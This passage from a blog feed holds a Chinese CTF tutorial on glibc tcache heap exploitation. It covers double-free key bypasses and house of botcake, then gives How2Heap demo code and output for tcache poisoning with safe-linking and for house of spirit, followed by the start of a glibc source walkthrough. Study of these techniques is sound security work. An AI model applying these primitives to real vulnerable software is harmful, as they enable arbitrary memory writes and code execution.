SIZE_SZ)</span></span><br></pre></td></tr></table></figure><p>alignof函数就不看了，这里基本上可以看出来chunk的对齐要求是2*SIZE_SZ的倍数，在64位中具体是32的倍数。需要注意的是这里检查的地址是mem的地址而不是chunk的地址。所以在利用的时候，比如劫持chunk的fd进行任意地址读写时，要挑选符合对齐要求的地址。在2.31及之前的glibc版本不需要进行检查。</p><p>检查代码参考：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">size_t</span> stack_var[<span class="number">0x10</span>];</span><br><span class="line"><span class="type">size_t</span>* target = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">0x10</span>; i++) </span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(((<span class="type">long</span>)&amp;stack_var[i] &amp; <span class="number">0xf</span>) == <span class="number">0</span>) </span><br><span class="line">    &#123;</span><br><span class="line">target = &amp;stack_var[i];</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">assert(target != <span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure><p>地址对齐检查机制是从2.32版本开始的。</p><h3 id="double-free中key的绕过"><a href="#double-free中key的绕过" class="headerlink" title="double free中key的绕过"></a>double free中key的绕过</h3><h4 id="方法一：破坏key"><a href="#方法一：破坏key" class="headerlink" title="方法一：破坏key"></a>方法一：破坏key</h4><p>空闲chunk进入tcache时会被赋予key，从tcache取出时会被置空，以此区分该chunk是否在tcache中。如果程序中存在UAF漏洞或者堆溢出漏洞，我们就可以将key位置置空或者换个数字，这样就可以直接绕过_int_free的第一个if判断，下面的count和对齐检查直接跳过。</p><h4 id="方法二：劫持size"><a href="#方法二：劫持size" class="headerlink" title="方法二：劫持size"></a>方法二：劫持size</h4><p>tcache会根据chunk的size来计算bin索引，而chunk只会在对应的bin内进行比较。如果在第一次释放victim后，利用uaf或者溢出修改victim的size，那么第二次释放的时候_int_free就会去检查修改后的索引对应的bin里有没有victim，从而绕过了检查。</p><h4 id="方法三：利用fastbin"><a href="#方法三：利用fastbin" class="headerlink" title="方法三：利用fastbin"></a>方法三：利用fastbin</h4><p>假如现在我们希望可以double free victim这个内存块，那么我们可以先申请7个和victim一样大的内存块，然后将它们全部释放以填满tcache中对应的那条bin，这时候再释放掉victim就可以使其进入fastbin。<br>这时候申请一个一样大的内存块，因为tcache的优先级大于fastbin，这个chunk会从tcachebin里取，而bin中只有6个chunk且不包含victim，这时可以对victim进行第二次释放就可以使它同时存在于tcachebin和fastbin。<br>其实也可以直接填满tcachebin之后，直接在fastbin里进行double free，因为fastbin只会对链表头部的chunk进行检查，相对比较好绕过，只需要在两次释放中间释放一个无关chunk就行。当然这受限于程序允许我们创建的chunk个数。</p><h4 id="方法四：house-of-botcake"><a href="#方法四：house-of-botcake" class="headerlink" title="方法四：house of botcake"></a>方法四：house of botcake</h4><p>这个方法和上一个方法有点像，但是是利用unsortedbin来实现。fastbin只能存0x80以下大小的chunk，并且想要取出来的话，需要先把tcachebin中的chunk取完才能轮得到fastbin，在一些自定义堆分配的菜单题里不太好用。利用过程如下:</p><ul><li>申请 7 个大小相同，大小大于 0x80 的 chunk，再申请三个，分别为 chunk A 和 chunkB 和 chunk C</li><li>释放前 7 个和 chunk A，前面 7 个都会进入到 tcachebin 里面，chunk A 进入到 unsortedbin</li><li>释放 chunk B，则 chunk B 会和 chunk A 合并</li><li>申请一个与前七个一样大的chunk，空出一个位置来</li><li>再次释放 chunk B，此时 B 同时存在与 unsortedbin 和 tcachebin</li><li>利用时，修改完chunk B的fd指针之后，只需要申请一块稍微比chunk B大一点点的内存，就能把我们想要进行读写操作的地址malloc出来了。</li></ul><h3 id="攻击手段"><a href="#攻击手段" class="headerlink" title="攻击手段"></a>攻击手段</h3><h4 id="tcache-poisoning-from-How2Heap"><a href="#tcache-poisoning-from-How2Heap" class="headerlink" title="tcache poisoning from How2Heap"></a>tcache poisoning from How2Heap</h4><h5 id="演示代码"><a href="#演示代码" class="headerlink" title="演示代码"></a>演示代码</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// disable buffering</span></span><br><span class="line">    <span class="comment">//禁止缓冲区防止打扰到堆布局</span></span><br><span class="line">setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//这里是为了寻找一个满足对齐要求的地址</span></span><br><span class="line"><span class="type">size_t</span> stack_var[<span class="number">0x10</span>];</span><br><span class="line"><span class="type">size_t</span> *target = <span class="literal">NULL</span>;</span><br><span class="line"><span class="comment">// choose a properly aligned target address</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (((<span class="type">long</span>)&amp;stack_var[i] &amp; <span class="number">0xf</span>) == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">target = &amp;stack_var[i];</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">assert(target != <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;The address we want malloc() to return is %p.\n&quot;</span>, target);</span><br><span class="line">    </span><br><span class="line"><span class="comment">/*从2.32版本开始，tcache引入了一个新的检查机制，申请chunk的时候，如果这个chunk尝试从tcache分配出来，则要检查tcache的counts数组成员在该bin下的大小是否为正数，即规定了assert (tcache-&gt;counts[tc_idx] &gt; 0);所以如果要通过劫持fd构造fake chunk来达到任意地址读写的效果，tcachebin中已有的chunk数量必须符合最后我们要申请chunk的数量*/</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Allocating 2 buffers.\n&quot;</span>);</span><br><span class="line"><span class="type">intptr_t</span> *a = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;malloc(128): %p\n&quot;</span>, a);</span><br><span class="line"><span class="type">intptr_t</span> *b = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;malloc(128): %p\n&quot;</span>, b);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Freeing the buffers...\n&quot;</span>);</span><br><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line"><span class="built_in">free</span>(b);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*注意LIFO原则*/</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Now the tcache list has [ %p -&gt; %p ].\n&quot;</span>, b, a);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;We overwrite the first %lu bytes (fd/next pointer) of the data at %p\n&quot;</span></span><br><span class="line">   <span class="string">&quot;to point to the location to control (%p).\n&quot;</span>,</span><br><span class="line">   <span class="keyword">sizeof</span>(<span class="type">intptr_t</span>), b, target);</span><br><span class="line">    </span><br><span class="line"><span class="comment">// VULNERABILITY</span></span><br><span class="line"><span class="comment">// the following operation assumes the address of b is known, which requires a heap leak</span></span><br><span class="line">    <span class="comment">/*这个地方麻烦一点。从2.32开始引入了fd加密机制，需要用到你要改写的chunk本身的mem地址。在实际利用中我们需要利用uaf等漏洞泄露chunk地址才能正确算出要覆盖的加密fd。*/</span></span><br><span class="line">b[<span class="number">0</span>] = (<span class="type">intptr_t</span>)((<span class="type">long</span>)target ^ (<span class="type">long</span>)b &gt;&gt; <span class="number">12</span>);</span><br><span class="line"><span class="comment">// VULNERABILITY</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Now the tcache list has [ %p -&gt; %p ].\n&quot;</span>, b, target);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;1st malloc(128): %p\n&quot;</span>, <span class="built_in">malloc</span>(<span class="number">128</span>));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Now the tcache list has [ %p ].\n&quot;</span>, target);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//申请第二块相同大小的chunk后就能从tcachebin中取出我们修改后伪造的chunk了</span></span><br><span class="line"><span class="type">intptr_t</span> *c = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;2nd malloc(128): %p\n&quot;</span>, c);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;We got the control\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">assert((<span class="type">long</span>)target == (<span class="type">long</span>)c);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="运行结果"><a href="#运行结果" class="headerlink" title="运行结果"></a>运行结果</h5><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">The</span> address we want <span class="title function_">malloc</span>() to <span class="keyword">return</span> is <span class="number">0x7fffffffddd0</span>.</span><br><span class="line"><span class="title class_">Allocating</span> <span class="number">2</span> buffers.</span><br><span class="line"><span class="title function_">malloc</span>(<span class="number">128</span>): <span class="number">0x5555555592a0</span></span><br><span class="line"><span class="title function_">malloc</span>(<span class="number">128</span>): <span class="number">0x555555559330</span></span><br><span class="line"><span class="title class_">Freeing</span> the buffers...</span><br><span class="line"><span class="title class_">Now</span> the tcache list has [ <span class="number">0x555555559330</span> -&gt; <span class="number">0x5555555592a0</span> ].</span><br><span class="line"><span class="title class_">We</span> overwrite the first <span class="number">8</span> bytes (fd/next pointer) <span class="keyword">of</span> the data at <span class="number">0x555555559330</span></span><br><span class="line">to point to the location to control (<span class="number">0x7fffffffddd0</span>).</span><br><span class="line"><span class="title class_">Now</span> the tcache list has [ <span class="number">0x555555559330</span> -&gt; <span class="number">0x7fffffffddd0</span> ].</span><br><span class="line">1st <span class="title function_">malloc</span>(<span class="number">128</span>): <span class="number">0x555555559330</span></span><br><span class="line"><span class="title class_">Now</span> the tcache list has [ <span class="number">0x7fffffffddd0</span> ].</span><br><span class="line">2nd <span class="title function_">malloc</span>(<span class="number">128</span>): <span class="number">0x7fffffffddd0</span></span><br><span class="line"><span class="title class_">We</span> got the control</span><br></pre></td></tr></table></figure><h5 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h5><p>首先申请两个chunk然后释放掉，让其进入tcachebin中。其中size为0x290的堆就是TcacheBin堆头。</p><p><img src="https://c-lby.github.io/images/tcache-poisoning/%E7%94%B3%E8%AF%B72%E4%B8%AAchunk.png" alt="申请2个chunk"></p><p><img src="https://c-lby.github.io/images/tcache-poisoning/%E9%87%8A%E6%94%BE2%E4%B8%AAchunk.png" alt="释放2个chunk"></p><p><img src="https://c-lby.github.io/images/tcache-poisoning/bin%E9%93%BE%E8%A1%A8.png" alt="bin链表"></p><p>从bin链表可以得知，根据tcachebin先进后出的原则，当我们再申请相同大小的chunk的时候，会先分配0x9330的chunk1，再分配0x92a0处的chunk0。这里需要注意一个问题，在heap命令下显示的地址是chunk地址，但是在链表中存的地址是mem地址。</p><p>我们发现每个chunk的fd有点怪，这是因为在高版本有fd加密机制，pwndbg没有解密就直接打印出来了，所以看起来很奇怪。在劫持fd的时候我们也要传入一个加密后的fd，否则会劫持失败。</p><p>下一步就要修改chunk1的fd，这样在申请chunk0的时候我们就可以申请到我们想要到的地方，达成任意地址读写的目的。如果我们修改的是chunk0的fd，那修改的就是堆头的地址，这样会造成堆错误，并且没法利用程序的读写功能达到我们的目的。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b[<span class="number">0</span>] = (<span class="type">intptr_t</span>)((<span class="type">long</span>)target ^ (<span class="type">long</span>)b &gt;&gt; <span class="number">12</span>);</span><br></pre></td></tr></table></figure><p>我们从malloc得到的指针是mem的地址，也就是user_data处，所以指针指向的地址就是储存fd的地方，如果有UAF或者堆溢出漏洞，我们就可以修改chunk的fd。fd加密机制用到了mem地址，所以修改fd的前提是有UAF或者能泄露堆地址。这里有另外一个需要注意的地方，tcachebin链表中的地址是mem地址，所以我们想要读写的地址直接就能写进fd，如果是fastbin，它的链表中的地址是chunk地址，那就需要将target-0x10写进fastbin的fd。</p><p><img src="/images/tcache-poisoning/fd%E4%BF%AE%E6%94%B9%E5%90%8E%E7%9A%84%E9%93%BE%E8%A1%A8.png" alt="fd修改后的链表"></p><p>可以看到链表已经被修改了，接下来申请的第二个chunk就是在栈上的地址了。 </p><h4 id="tcache-house-of-spirit-from-How2Heap"><a href="#tcache-house-of-spirit-from-How2Heap" class="headerlink" title="tcache house of spirit from How2Heap"></a>tcache house of spirit from How2Heap</h4><h5 id="演示代码-1"><a href="#演示代码-1" class="headerlink" title="演示代码"></a>演示代码</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Calling malloc() once so that it sets up its memory.\n&quot;</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Let&#x27;s imagine we will overwrite 1 pointer to point to a fake chunk region.\n&quot;</span>);</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> *a; <span class="comment">//pointer that will be overwritten</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> fake_chunks[<span class="number">10</span>]; <span class="comment">//fake chunk region这是一个chunk</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;This region contains one fake chunk. It&#x27;s size field is placed at %p\n&quot;</span>, &amp;fake_chunks[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">fake_chunks[<span class="number">1</span>] = <span class="number">0x40</span>; <span class="comment">// this is the size</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.\n&quot;</span>, &amp;fake_chunks[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">a = &amp;fake_chunks[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Freeing the overwritten pointer.\n&quot;</span>);</span><br><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Now the next malloc will return the region of our fake chunk at %p, which will be %p!\n&quot;</span>, &amp;fake_chunks[<span class="number">1</span>], &amp;fake_chunks[<span class="number">2</span>]);</span><br><span class="line"><span class="type">void</span> *b = <span class="built_in">malloc</span>(<span class="number">0x30</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;malloc(0x30): %p\n&quot;</span>, b);</span><br><span class="line"></span><br><span class="line">assert((<span class="type">long</span>)b == (<span class="type">long</span>)&amp;fake_chunks[<span class="number">2</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="运行结果-1"><a href="#运行结果-1" class="headerlink" title="运行结果"></a>运行结果</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Calling <span class="title function_">malloc</span><span class="params">()</span> once so that it sets up its memory.</span><br><span class="line">Let&#x27;s imagine we will overwrite 1 pointer to point to a fake chunk region.</span><br><span class="line">This region contains one fake chunk. It&#x27;s size field is placed at 0x7fffffffde08</span><br><span class="line">Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, 0x7fffffffde08.</span><br><span class="line">Freeing the overwritten pointer.</span><br><span class="line">Now the next <span class="built_in">malloc</span> will <span class="keyword">return</span> the region of our fake chunk at 0x7fffffffde08, which will be 0x7fffffffde10!</span><br><span class="line"><span class="title function_">malloc</span><span class="params">(<span class="number">0x30</span>)</span>: 0x7fffffffde10</span><br></pre></td></tr></table></figure><h5 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h5><p>这种攻击手段在非堆段的地址伪造了一个chunk，实现了任意地址读写的效果。首先一定要先申请一个chunk以满足对bin中chunk count的检查。然后要修改需要劫持的fake chunk中的size字段。假如我们要修改0x10处的数值，根据chunk的结构不难知道，我们要构造的fake chunk的地址在0x00，那么size字段在0x08处。需要注意的是tcachebin链表中的地址存的是mem地址，所以释放的时候要释放0x10处。注意这个chunk的地址需满足对齐要求。</p><p>size的限制则是不能小于最小size，不能大于最大size（0x410）并且应为0x10的倍数。进入tcachebin时，_int_free不会对PREV_INUSE进行检查，所以size写0x40也行写0x41也行，但是对A和M标志位会检查，如果其值为1时，则会报错invalid pointer。要修改size字段的前提是程序对目标地址本来就能写或者有溢出刚好可以修改size字段，至少要有off by one；如果是要修改堆上地址的话，有uaf也许也能成功劫持。</p><p><img src="https://c-lby.github.io/images/tcache-poisoning/house_of_spirit%E6%A0%87%E5%BF%97%E4%BD%8D%E6%A3%80%E6%9F%A5%E6%8A%A5%E9%94%99.png" alt="house_of_spirit标志位检查报错"></p><p>目标地址伪造前：</p><p><img src="https://c-lby.github.io/images/tcache-poisoning/%E6%9C%AA%E4%BF%AE%E6%94%B9%E7%9A%84fake_chunk.png" alt="未修改的fake_chunk"></p><p>目标地址修改size：</p><p><img src="https://c-lby.github.io/images/tcache-poisoning/%E4%BF%AE%E6%94%B9size%E5%90%8E%E7%9A%84fake_chunk.png" alt="修改size后的fake_chunk"></p><p>目标地址被释放后：</p><p><img src="https://c-lby.github.io/images/tcache-poisoning/%E9%87%8A%E6%94%BE%E5%90%8E%E7%9A%84fake_chunk.png" alt="释放后的fake_chunk"></p><p>如果可以成功被释放，说明fake chunk成功绕过检查了。这时候tcachebin中链表就会存有目标地址，下一次申请一个size大小的chunk的时候就可以申请到这一块地址，实现读写。</p><p><img src="https://c-lby.github.io/images/tcache-poisoning/house_of_spirit%E5%8A%AB%E6%8C%81%E6%88%90%E5%8A%9F%E5%90%8E%E7%9A%84bin%E9%93%BE%E8%A1%A8.png" alt="house_of_spirit劫持成功后的bin链表"></p><h4 id="tcache-stashing-unlink-attack-from-How2Heap"><a href="#tcache-stashing-unlink-attack-from-How2Heap" class="headerlink" title="tcache stashing unlink attack from How2Heap"></a>tcache stashing unlink attack from How2Heap</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*To be continued...*/</span></span><br></pre></td></tr></table></figure><p>参考阅读：<br>- <a href="https://jiaweihawk.gitee.io/2021/09/03/tcache%E4%B8%AD%E7%9A%84double-free/#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90">tcache中的double free</a><br>- <a href="https://www.yuque.com/xswlhhh/ctf/gvg9gbmc0mwsvq6k">xswlhhh爷的博客！</a></p>]]></content>
    
    
    <summary type="html">除非特别说明，默认为glibc_2.35</summary>
    
    
    
    <category term="Heap Exploitation" scheme="https://c-lby.top/categories/Heap-Exploitation/"/>
    
    
    <category term="heap" scheme="https://c-lby.top/tags/heap/"/>
    
    <category term="CTF" scheme="https://c-lby.top/tags/CTF/"/>
    
    <category term="PWN" scheme="https://c-lby.top/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>『glibc源码补完计划』TcacheBin</title>
    <link href="https://c-lby.top/2024/02/14/glibc_tcachebin/"/>
    <id>https://c-lby.top/2024/02/14/glibc_tcachebin/</id>
    <published>2024-02-14T10:24:46.000Z</published>
    <updated>2024-03-04T04:33:27.158Z</updated>
    
    <content type="html"><![CDATA[<h2 id="TcacheBin"><a href="#TcacheBin" class="headerlink" title="TcacheBin"></a>TcacheBin</h2><p>tcache全称 thread local caching，TcacheBin是从glibc2.26才开始加入的缓存机制，访问速度比fastbin更快，优先级更高，相对的检查机制也比较弱，容易攻击。</p><h3 id="TcacheBin相关数据结构"><a href="#TcacheBin相关数据结构" class="headerlink" title="TcacheBin相关数据结构"></a>TcacheBin相关数据结构</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line"><span class="comment">/* We want 64 entries.  This is an arbitrary limit, which tunables can reduce.  */</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> TCACHE_MAX_BINS64</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> MAX_TCACHE_SIZEtidx2usize (TCACHE_MAX_BINS-1)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Only used to pre-fill the tunables.  */</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> tidx2usize(idx)(((size_t) idx) * MALLOC_ALIGNMENT + MINSIZE - SIZE_SZ)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* When &quot;x&quot; is from chunksize().  */</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> csize2tidx(x) (((x) - MINSIZE + MALLOC_ALIGNMENT - 1) / MALLOC_ALIGNMENT)</span></span><br><span class="line"><span class="comment">/* When &quot;x&quot; is a user-provided size.  */</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> usize2tidx(x) csize2tidx (request2size (x))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* With rounding and alignment, the bins are...</span></span><br><span class="line"><span class="comment">   idx 0   bytes 0..24 (64-bit) or 0..12 (32-bit)</span></span><br><span class="line"><span class="comment">   idx 1   bytes 25..40 or 13..20</span></span><br><span class="line"><span class="comment">   idx 2   bytes 41..56 or 21..28</span></span><br><span class="line"><span class="comment">   etc.  */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* This is another arbitrary limit, which tunables can change.  Each</span></span><br><span class="line"><span class="comment">   tcache bin will hold at most this number of chunks.  */</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> TCACHE_FILL_COUNT 7</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Maximum chunks in tcache bins for tunables.  This value must fit the range</span></span><br><span class="line"><span class="comment">   of tcache-&gt;counts[] entries, else they may overflow.  */</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> MAX_TCACHE_COUNT UINT16_MAX</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* We overlay this structure on the user-data portion of a chunk when</span></span><br><span class="line"><span class="comment">   the chunk is stored in the per-thread cache.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">  <span class="comment">/* This field exists to detect double frees.  */</span></span><br><span class="line">  <span class="type">uintptr_t</span> key;</span><br><span class="line">&#125; tcache_entry;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* There is one of these for each thread, which contains the</span></span><br><span class="line"><span class="comment">   per-thread cache (hence &quot;tcache_perthread_struct&quot;).  Keeping</span></span><br><span class="line"><span class="comment">   overall size low is mildly important.  Note that COUNTS and ENTRIES</span></span><br><span class="line"><span class="comment">   are redundant (we could have just counted the linked list each</span></span><br><span class="line"><span class="comment">   time), this is for performance reasons.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">uint16_t</span> counts[TCACHE_MAX_BINS];</span><br><span class="line">  tcache_entry *entries[TCACHE_MAX_BINS];</span><br><span class="line">&#125; tcache_perthread_struct;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> __thread <span class="type">bool</span> tcache_shutting_down = <span class="literal">false</span>;</span><br><span class="line"><span class="type">static</span> __thread tcache_perthread_struct *tcache = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Process-wide key to try and catch a double-free in the same thread.  */</span></span><br><span class="line"><span class="type">static</span> <span class="type">uintptr_t</span> tcache_key;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span 